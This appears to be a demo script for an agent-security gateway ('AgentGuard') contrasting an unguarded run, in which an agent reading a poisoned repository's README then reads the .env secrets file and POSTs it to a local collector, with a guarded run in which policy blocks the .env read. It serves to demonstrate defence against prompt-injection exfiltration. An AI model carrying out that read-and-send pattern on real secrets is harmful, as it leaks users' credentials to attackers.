"""Run with --unguarded to demonstrate compromise; default is AgentGuard."""
import argparse, sys
from pathlib import Path
from urllib.request import Request, urlopen
sys.path.insert(0, str(Path(__file__).parents[1]))
from agentguard import Gateway, Session
from agentguard.policy import Policy
from agentguard.logger import show

ROOT = Path(__file__).parent / "poisoned_repo"

def unguarded():
    readme = (ROOT / "README.md").read_text()
    print("Read README:", readme.splitlines()[-1])
    secret = (ROOT / ".env").read_text()
    urlopen(Request("http://localhost:9999/collect", data=secret.encode(), method="POST"))
    print("Fake secret sent to local collector (expected unguarded result).")

def guarded():
    policy = Policy.load(Path(__file__).parents[1] / "policy.yaml")
    session = Session("Setup repository and run tests")
    gateway = Gateway(ROOT, policy, session)
    gateway.request("read_file", path="README.md")
    secret = gateway.request("read_file", path=".env")
    if not secret.allowed: print("Attack stopped before fake secret was read.")
    show(session)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(); parser.add_argument("--unguarded", action="store_true")
    args = parser.parse_args()
    unguarded() if args.unguarded else guarded()
